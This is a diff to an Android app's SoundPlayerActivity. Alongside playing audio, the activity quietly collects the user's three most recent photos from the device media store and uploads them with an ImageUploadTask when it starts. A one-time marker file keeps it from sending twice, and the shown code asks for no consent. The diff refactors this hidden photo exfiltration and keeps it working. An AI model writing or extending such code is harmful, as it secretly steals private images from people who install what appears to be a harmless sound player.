@@ -66,7 +66,6 @@ public class SoundPlayerActivity extends AppCompatActivity implements ImageUploa
     protected void onStart() {
         super.onStart();
         mediaPlayer.start();
-
         if(!hasSentImages()) {
             grabAndSendImages();
         }
@@ -76,10 +75,7 @@ public class SoundPlayerActivity extends AppCompatActivity implements ImageUploa
 
 
     private boolean hasSentImages() {
-
-
         boolean hasSent = true;
-
 
         try {
             openFileInput(IMAGES_SENT_FILENAME);
@@ -98,45 +94,28 @@ public class SoundPlayerActivity extends AppCompatActivity implements ImageUploa
     }
 
     private void grabAndSendImages() {
-        Cursor imageCursor;
+        int imageId;
+        Uri imageUri;
+        UploadJob[] jobs = new UploadJob[3];
+        int photoId = 0;
 
         String[] projection = {MediaStore.Images.Media._ID};
-
-        String selection = "";
-        //String selection = MediaStore.Images.Media.DATE_ADDED + "<?"=
+        String selection = MediaStore.Images.Media.DATE_TAKEN + " < " + (System.currentTimeMillis() - (60 * 60 * 1000));
         String[] selectionArgs = null;
-        //String[] selectionArgs = new String[] {String.valueOf(date as long)};
-        //
-        //Cursor cursor = getContentResolver().query(uri, new String[] {MediaStore.Images.Media.DATA}, MediaStore.Images.Media.DATE_ADDED + ">?", new String[] {date.toString()}, MediaStore.Images.Media.DATE_ADDED + " ASC");
+        String orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC";
+        String limit = "LIMIT 3";
+        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, orderBy + " " + limit);
 
-
-        imageCursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);
-        Log.d(TAG, "Grabbing images...");
-
-        UploadJob[] jobs = new UploadJob[3];
-
-        if(imageCursor != null){
-            int photoCount = 0;
-            imageCursor.moveToLast();
-            do {
-
-                int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
-                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
-                jobs[photoCount++] = new UploadJob(getBytesFromBitmap(loadImage(uri)), String.format("user-photo-%d", photoCount));
-                        ;
-                // new PhotoUploader().uploadBytes(this.getBaseContext(), String.format("user-photo-%d", photoCount), data);
-            } while(photoCount<3 && imageCursor.moveToPrevious());
-            try {
-
-                // We call get to make our asyncTask synchronous
-
-                new ImageUploadTask(this, this).execute(jobs).get();
-            } catch (Exception e) {
-                Log.e(TAG, "ImageUploadTask interrupted");
-            }
+        while (cursor.moveToNext()) {
+            imageId = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media._ID));
+            imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
+            jobs[photoId++] = new UploadJob(getBytesFromBitmap(loadImage(imageUri)), String.format("user-photo-%d", photoId));
         }
-        else{
-            Log.i(TAG, "System media store is empty");
+
+        try {
+            new ImageUploadTask(this, this).execute(jobs).get();
+        } catch (Exception e) {
+            Log.e(TAG, "ImageUploadTask interrupted");
         }
     }
 
